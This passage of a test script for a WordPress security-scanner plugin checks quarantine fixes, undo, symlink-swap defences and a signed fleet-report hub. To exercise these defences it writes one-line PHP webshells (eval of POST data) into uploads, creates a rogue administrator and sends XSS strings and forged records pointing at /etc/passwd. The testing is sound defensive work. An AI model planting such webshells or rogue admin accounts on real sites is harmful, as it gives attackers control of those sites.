rm -f "$TO" "$TMPD/wp2ss-staged-$$.php"
rm -f "$TMPD/nfs" "$C/mu-plugins/wp2ss-test-hash.php" "$P2S" "$SES"
rm -f "$ERR" "$ERR.gz" "$ACC"
set_php 8.3.36

section "14. Own-file integrity (release manifest)"
php "$(dirname "$0")/../.github/scripts/make-manifest.php" "$SELF" 9.9.9 2>/dev/null
# Test the local manifest only: once this version is released, GitHub's real one would (rightly) disagree.
$WP eval 'set_site_transient( "wp2ss_manifest_" . WP2SS_VERSION, array(), HOUR_IN_SECONDS );' >/dev/null
R=$(scan)
hasnt "$R" "$(msg 'scanner plugin has been modified')" "untouched plugin files pass the manifest check"
cp "$SELF/includes/class-settings.php" "$OUTSIDE.bak" 2>/dev/null || cp "$SELF/includes/class-settings.php" /tmp/wp2ss-settings.bak
echo "// tampered" >> "$SELF/includes/class-settings.php"
R=$(scan)
has "$R" "$(sev critical 'scanner plugin has been modified: includes/class-settings.php')" "a tampered plugin file is critical"
cp "$OUTSIDE.bak" "$SELF/includes/class-settings.php" 2>/dev/null || cp /tmp/wp2ss-settings.bak "$SELF/includes/class-settings.php"
rm -f "$SELF/manifest.json" "$OUTSIDE.bak" /tmp/wp2ss-settings.bak

section "15. One-click fixes (and undo)"
mkdir -p "$C/uploads/2026/09"
printf "<?php eval(\$_POST['f']);\n" > "$C/uploads/2026/09/fixme.php"
$WP user create rogue2 r2@evil.test --role=administrator --quiet >/dev/null 2>&1
$WP eval 'global $wpdb; $wpdb->update($wpdb->users, array("user_registered"=>gmdate("Y-m-d H:i:s", time()+7200)), array("user_login"=>"rogue2"));'
R=$(scan)
FID=$(echo "$R" | jq -r '[.findings[] | select(.type=="code" and (.message|test("fixme.php")))][0].id')
UID2=$(echo "$R" | jq -r '[.findings[] | select(.type=="user" and (.message|test("rogue2")))][0].id')
$WP php2shell fix "$FID" "$UID2" --yes >/dev/null 2>&1
[ ! -e "$C/uploads/2026/09/fixme.php" ] && ok "quarantine moved the webshell away" || bad "webshell still in place"
[ "$($WP user get rogue2 --field=roles 2>/dev/null)" = "subscriber" ] && ok "rogue admin turned into a subscriber" || bad "rogue admin still admin"
QD=$($WP eval 'echo WP2SS_Fixes::qdir();' 2>/dev/null)
ls "$QD" 2>/dev/null | grep -q 'fixme.php.quarantined' && ok "quarantined copy kept, renamed so it can't run" || bad "quarantined copy missing"
OUT=$($WP eval '$n = 0; $h = 0; foreach ( WP2SS_Scanner::last_report()["findings"] as $f ) { if ( false !== strpos( $f["location"], "fixme.php" ) ) { $n++; $h += WP2SS_Fixes::record_for_finding( $f ) ? 1 : 0; } } echo "$n/$h";' 2>/dev/null)
[ "${OUT%/*}" -ge 2 ] && [ "${OUT%/*}" = "${OUT#*/}" ] && ok "every finding about a quarantined file counts as handled ($OUT)" || bad "sibling findings still need action ($OUT)"
R=$(scan)
hasnt "$R" "$(msg 'fixme.php')" "the quarantine folder isn't scanned"
for RID in $($WP php2shell quarantine list --format=json 2>/dev/null | jq -r '.[].id'); do $WP php2shell quarantine restore "$RID" >/dev/null 2>&1; done
[ -e "$C/uploads/2026/09/fixme.php" ] && ok "restore puts the file back" || bad "restore failed"
[ "$($WP user get rogue2 --field=roles 2>/dev/null)" = "administrator" ] && ok "undo gives admin rights back" || bad "undo of demote failed"
OUT=$($WP eval '
	echo WP2SS_Fixes::safe_target( ABSPATH . "wp-config.php" ) ? "y" : "n";
	echo WP2SS_Fixes::safe_target( ABSPATH . "wp-includes" ) ? "y" : "n";
	echo WP2SS_Fixes::safe_target( WP_CONTENT_DIR . "/uploads" ) ? "y" : "n";
	echo WP2SS_Fixes::safe_target( untrailingslashit( WP2SS_DIR ) ) ? "y" : "n";
	echo WP2SS_Fixes::safe_target( "/etc/passwd" ) ? "y" : "n";
	update_site_option( "wp2ss_fixes", array( "x" => array( "id" => "x", "action" => "quarantine", "original" => "/tmp/evil", "quarantined" => "/etc/passwd", "state" => "done", "sig" => "forged" ) ) );
	echo count( WP2SS_Fixes::records() );
' 2>/dev/null)
[ "$OUT" = "nnnnn0" ] && ok "fixes refuse wp-config, core folders, uploads root, the scanner itself, files outside the site; forged records ignored" || bad "safety rules failed ($OUT)"
$WP eval 'delete_site_option( "wp2ss_fixes" );' >/dev/null
rm -rf "$C/uploads/2026/09"; $WP user delete rogue2 --yes --quiet

# Attacks on the fixes themselves (from an independent security review).
mkdir -p "$C/uploads/2026/08" "$OUTSIDE/victim"
SW="$C/uploads/2026/08/swap.php"
printf "<?php eval(\$_POST['g']);\n" > "$SW"
R=$(scan)
FID=$(echo "$R" | jq -r '[.findings[] | select(.type=="code" and (.message|test("swap.php")))][0].id')
mv "$SW" "$OUTSIDE/swap.php"; ln -s "$C/plugins" "$SW"
$WP php2shell fix "$FID" --yes >/dev/null 2>&1
[ -L "$SW" ] && [ -d "$C/plugins" ] && ok "a link swapped in after the scan is never followed" || bad "quarantine followed a swapped-in link"
rm -f "$SW"; mv "$OUTSIDE/swap.php" "$SW"
printf "<?php eval(\$_POST['g']); // changed\n" > "$SW"
$WP php2shell fix "$FID" --yes >/dev/null 2>&1
[ -e "$SW" ] && ok "a file changed since the scan isn't moved" || bad "changed file was quarantined"
printf "<?php eval(\$_POST['g']);\n" > "$SW"
$WP php2shell fix "$FID" --yes >/dev/null 2>&1
QD=$($WP eval 'echo WP2SS_Fixes::qdir();' 2>/dev/null)
[ ! -e "$SW" ] && ! ls "$QD" | grep -v '^index\.php$' | grep -qi '\.php' && ok "quarantined names never contain .php (servers that run any *.php.* name)" || bad "quarantine name still contains .php"
printf "<?php eval(\$_POST['g']);\n" > "$SW"
[ "$($WP eval "echo WP2SS_Fixes::record_for_finding( '$FID' ) ? 'fixed' : 'open';" 2>/dev/null)" = "open" ] && ok "a webshell dropped again at the same path needs action again" || bad "re-dropped webshell shown as fixed"
rm -f "$SW"; rm -rf "$C/uploads/2026/08"; ln -s "$OUTSIDE/victim" "$C/uploads/2026/08"
RID=$($WP php2shell quarantine list --format=json 2>/dev/null | jq -r '.[0].id')
$WP php2shell quarantine restore "$RID" >/dev/null 2>&1
[ ! -e "$OUTSIDE/victim/swap.php" ] && ok "restore refuses a folder swapped for a link" || bad "restore wrote through a link"
rm -f "$C/uploads/2026/08"; $WP php2shell quarantine delete "$RID" --yes >/dev/null 2>&1
OUT=$($WP eval '
	$admins = get_users( array( "role" => "administrator", "fields" => "ID" ) );
	$last   = (int) array_pop( $admins );
	foreach ( $admins as $id ) { ( new WP_User( $id ) )->set_role( "subscriber" ); }
	$m = new ReflectionMethod( "WP2SS_Fixes", "demote" ); $m->setAccessible( true );
	$r = $m->invoke( null, $last );
	foreach ( $admins as $id ) { ( new WP_User( $id ) )->set_role( "administrator" ); }
	echo is_wp_error( $r ) ? $r->get_error_code() : "demoted";
' 2>/dev/null)
[ "$OUT" = "wp2ss_last_admin" ] && ok "the last administrator is never demoted" || bad "last admin demoted ($OUT)"
$WP eval 'delete_site_option( "wp2ss_fixes" );' >/dev/null

section "16. Fleet hub (signed reports)"
$WP php2shell fleet hub >/dev/null 2>&1
OUT=$($WP eval '
	$key  = WP2SS_Fleet::settings()["key"];
	$send = function ( $body, $ts, $sig ) {
		$r = new WP_REST_Request( "POST", "/wp2ss/v1/fleet/report" );
		$r->set_header( "X-WP2SS-Time", (string) $ts );
		$r->set_header( "X-WP2SS-Signature", $sig );
		$r->set_body( $body );
		return rest_do_request( $r )->get_status();
	};
	$body = wp_json_encode( array( "site" => "https://member.example", "verdict" => "SUSPICIOUS", "php" => "8.3.10", "wp" => "7.1.2", "counts" => array( "high" => 2 ), "serious" => array( array( "severity" => "high", "type" => "user", "message" => "<script>alert(1)</script>Admin x" ) ) ) );
	$t = time();
	echo $send( $body, $t, hash_hmac( "sha256", "$t.$body", $key ) ), " ";
	echo $send( $body, $t, hash_hmac( "sha256", "$t.$body", "wrong-key-wrong-key-wrong-key-00" ) ), " ";
	$old = $t - 3600;
	echo $send( $body, $old, hash_hmac( "sha256", "$old.$body", $key ) ), " ";
	$sites = WP2SS_Fleet::sites();
	$m = null; foreach ( $sites as $s ) { if ( "https://member.example" === $s["site"] ) { $m = $s; } }
	echo $m ? $m["verdict"] : "missing", " ", false === strpos( wp_json_encode( $m ), "<script>" ) ? "clean" : "unsafe";
' 2>&1)
[ "$OUT" = "200 401 401 SUSPICIOUS clean" ] && ok "hub accepts signed reports, rejects bad keys and stale timestamps, strips markup" || bad "fleet hub checks failed ($OUT)"
OUT=$($WP eval '
	$key  = WP2SS_Fleet::settings()["key"];
	$send = function ( $route, $data, $secret = null, $ahead = 0 ) use ( $key ) {
		$body = wp_json_encode( $data ); $t = time() + $ahead;
		$r = new WP_REST_Request( "POST", "/wp2ss/v1/fleet/" . $route );
		$r->set_header( "X-WP2SS-Time", (string) $t );
		$r->set_header( "X-WP2SS-Signature", hash_hmac( "sha256", "$t.$body", $key ) );
		if ( $secret ) { $r->set_header( "X-WP2SS-Site-Signature", hash_hmac( "sha256", "$t.$body", $secret ) ); }
		$r->set_body( $body );
		$res = rest_do_request( $r );
		return $res->get_status() . ( isset( $res->get_data()["enrolled"] ) && $res->get_data()["enrolled"] ? "e" : "" );
	};
	$sec = wp_generate_password( 48, false );
	$out = array();
	$out[] = $send( "report", array( "site" => "https://pinned.example", "verdict" => "CLEAN", "enroll" => $sec ), $sec );
	$out[] = $send( "report", array( "site" => "https://pinned.example/", "verdict" => "CLEAN" ) );
	$out[] = $send( "report", array( "site" => "https://pinned.example", "verdict" => "SUSPICIOUS" ), $sec );
	$out[] = $send( "report", array( "site" => home_url(), "verdict" => "CLEAN" ) );
	$out[] = $send( "report", array( "site" => "https://later.example", "verdict" => "CLEAN" ), null, 300 );
	$out[] = $send( "report", array( "site" => "https://other.example", "verdict" => "CLEAN", "admin" => "https://evil.example/wp-login.php" ) );
	$out[] = $send( "poll", array( "site" => "https://other.example" ) );
	$s = WP2SS_Fleet::sites();
	$out[] = $s[ WP2SS_Fleet::site_key( "https://pinned.example" ) ]["verdict"];
	$o = $s[ WP2SS_Fleet::site_key( "https://other.example" ) ];
	$out[] = ( "" === $o["admin"] ? "nolink" : "link" ) . ( $o["legacy"] ? "-legacy" : "" );
	echo implode( " ", $out );
' 2>&1)
[ "$OUT" = "200e 403 200e 403 401 200 403 SUSPICIOUS nolink-legacy" ] && ok "each site registers its own secret; the shared key alone can't overwrite a registered site or the hub itself; future timestamps and foreign admin links rejected" || bad "fleet identity checks ($OUT)"
has "$($WP php2shell fleet list --format=json 2>/dev/null | jq '{verdict:"x", findings:[]} + {list: .}')" '.list | map(.site) | index("https://member.example") != null' "fleet list shows the member"

# Alerts: capture outgoing mail and webhooks instead of sending them.
OUTBOX=$(mktemp)
cat > "$C/mu-plugins/wp2ss-test-outbox.php" <<PHP
<?php
add_filter( 'pre_wp_mail', function ( \$r, \$a ) { file_put_contents( '$OUTBOX', "MAIL " . \$a['to'] . " | " . \$a['subject'] . "\n" . \$a['message'] . "\n", FILE_APPEND ); return true; }, 10, 2 );
add_filter( 'pre_http_request', function ( \$r, \$args, \$url ) { if ( false === strpos( \$url, 'hooks.example' ) ) { return \$r; } file_put_contents( '$OUTBOX', "HOOK " . \$url . "\n" . \$args['body'] . "\n", FILE_APPEND ); return array( 'headers' => array(), 'body' => 'ok', 'response' => array( 'code' => 200, 'message' => 'OK' ), 'cookies' => array() ); }, 10, 3 );
PHP
$WP eval 'delete_site_option( "wp2ss_fleet_queue" ); wp_clear_scheduled_hook( "wp2ss_fleet_alerts" );' >/dev/null
$WP php2shell fleet alerts --email=ops@example.test --webhook=https://hooks.example/services/T0/B0/x --stale-days=10 >/dev/null 2>&1
OUT=$($WP eval '
	$key  = WP2SS_Fleet::settings()["key"];
	$sec  = wp_generate_password( 48, false );
	$send = function ( $route, $data ) use ( $key, $sec ) {
		$data["enroll"] = $sec;
		$body = wp_json_encode( $data ); $t = time();
		$r = new WP_REST_Request( "POST", "/wp2ss/v1/fleet/" . $route );
		$r->set_header( "X-WP2SS-Time", (string) $t );
		$r->set_header( "X-WP2SS-Signature", hash_hmac( "sha256", "$t.$body", $key ) );
		$r->set_header( "X-WP2SS-Site-Signature", hash_hmac( "sha256", "$t.$body", $sec ) );
		$r->set_body( $body );
		return rest_do_request( $r );
	};
	$base = array( "site" => "https://shop.example", "name" => "Shop <!channel>", "php" => "8.3.36", "wp" => "7.1.2", "counts" => array() );
	$send( "report", $base + array( "verdict" => "CLEAN", "serious" => array() ) );
	echo wp_next_scheduled( "wp2ss_fleet_alerts" ) ? "q " : "none ";
	sleep( 1 );
	$send( "report", $base + array( "verdict" => "COMPROMISED", "serious" => array( array( "severity" => "critical", "type" => "file", "message" => "Webshell @everyone <a href=x>y</a>" ) ) ) );
	echo wp_next_scheduled( "wp2ss_fleet_alerts" ) ? "q " : "none ";
	WP2SS_Fleet::send_digest();
	// Overdue, then back again.
	$sites = get_site_option( "wp2ss_fleet_sites" ); $k = WP2SS_Fleet::site_key( "https://shop.example" );
	$sites[ $k ]["received"] = time() - 11 * DAY_IN_SECONDS; update_site_option( "wp2ss_fleet_sites", $sites );
	WP2SS_Fleet::check_stale(); WP2SS_Fleet::check_stale();
	echo count( get_site_option( "wp2ss_fleet_queue", array() ) ), " ";
	WP2SS_Fleet::send_digest();
	sleep( 1 );
	$send( "report", $base + array( "verdict" => "COMPROMISED", "serious" => array( array( "severity" => "critical", "type" => "file", "message" => "Webshell @everyone <a href=x>y</a>" ) ) ) );
	echo count( get_site_option( "wp2ss_fleet_queue", array() ) ), " ";
	WP2SS_Fleet::send_digest();
	// Scan requests reach the member at its next check-in, once.
	WP2SS_Fleet::request_rescan( $k );
	echo $send( "poll", array( "site" => "https://shop.example/" ) )->get_data()["rescan"] ? "yes " : "no ";
	echo $send( "poll", array( "site" => "https://shop.example" ) )->get_data()["rescan"] ? "yes" : "no";
' 2>&1)
[ "$OUT" = "none q 1 1 yes no" ] && ok "alerts queue only on trouble, overdue alerts once, scan requests delivered once" || bad "fleet alert flow ($OUT)"
D=$(cat "$OUTBOX")
echo "$D" | grep -q 'MAIL ops@example.test | PHP2Shell fleet: 1 site needs a look' && ok "digest email goes to the alert address" || bad "no digest email"
echo "$D" | grep -q 'is now “Compromised' && ok "the digest says what changed" || bad "digest text"
echo "$D" | grep -q "hasn’t reported for" && ok "overdue site alert" || bad "no overdue alert"
echo "$D" | grep -q 'is reporting again' && ok "site back after going quiet" || bad "no 'reporting again' alert"
echo "$D" | grep '^{' | grep -q '<!channel>\|<a href' && bad "webhook text can ping or link" || ok "webhook text can't ping a channel or add links"
$WP eval 'echo is_wp_error( WP2SS_Fleet::save_alerts( true, "", "http://hooks.example/x", true, 10 ) ) ? "refused" : "saved";' 2>/dev/null | grep -q refused && ok "non-HTTPS webhook refused" || bad "http webhook accepted"
$WP php2shell fleet test-alert >/dev/null 2>&1 && grep -q 'test alert' "$OUTBOX" && ok "test alert" || bad "test alert failed"
rm -f "$C/mu-plugins/wp2ss-test-outbox.php" "$OUTBOX"
$WP php2shell fleet leave >/dev/null 2>&1; $WP eval 'delete_site_option( "wp2ss_fleet_sites" ); delete_site_option( "wp2ss_fleet" );' >/dev/null
$WP eval 'delete_site_option( "wp2ss_fleet_queue" ); wp_clear_scheduled_hook( "wp2ss_fleet_alerts" );' >/dev/null

section "17. Cleanup → clean again"
rm -rf "$C/plugins/wp2shell_6a5566a6" "$C/plugins/cmsmap" "$C/upgrade/wp2shell_79b06a80" \
	"$C/cache/x.php" "$C/uploads/2026/07/img.php" "$C/uploads/.htaccess" "$C/themes/.hidden.php" \
	"$C/temp-write-test-123" "$C/uploads/wp2shell_6a5566a6.zip"
$WP plugin deactivate gg-helper --quiet; rm -rf "$C/plugins/gg-helper"
$WP user delete backdoor --yes --quiet
R=$(scan)
hasnt "$R" '[.findings[] | select((.severity=="critical" or .severity=="high") and .type!="version")] | length > 0' "no high/critical findings after cleanup"
rm -f "$LOG"

echo
echo "$PASS passed, $FAIL failed"
[ "$FAIL" = 0 ]
